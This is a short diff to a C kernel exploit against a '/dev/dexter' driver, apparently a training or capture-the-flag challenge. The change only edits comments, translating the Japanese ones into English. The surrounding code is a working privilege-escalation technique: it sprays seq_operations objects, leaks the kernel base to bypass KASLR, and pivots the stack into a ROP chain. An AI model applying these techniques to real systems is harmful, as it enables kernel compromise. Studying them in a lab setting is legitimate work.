@@ -119,7 +119,7 @@ void overwrite(char *buf, size_t len) {
 int main() {
   save_state();
 
-  // spray `seq_operations` around the Dexter buffer
+  // Spray `seq_operations` around the Dexter buffer
   int spray[0x100];
   for (int i = 0; i < 0x80; i++)
     spray[i] = open("/proc/self/stat", O_RDONLY);
@@ -127,8 +127,6 @@ int main() {
   if (fd == -1) fatal("/dev/dexter");
   for (int i = 0x80; i < 0x100; i++)
     spray[i] = open("/proc/self/stat", O_RDONLY);
-
-  // KASLR回避
   char buf[0x40];
   overread(buf, 0x40);
   kbase = *(unsigned long*)&buf[0x20] - ofs_seq_start;
@@ -157,7 +155,7 @@ int main() {
   *chain++ = user_rsp;
   *chain++ = user_ss;
 
-  // RIP制御
+  // RIP control
   *(unsigned long*)&buf[0x20] = rop_mov_esp_39000000h;
   overwrite(buf, 0x28);
 
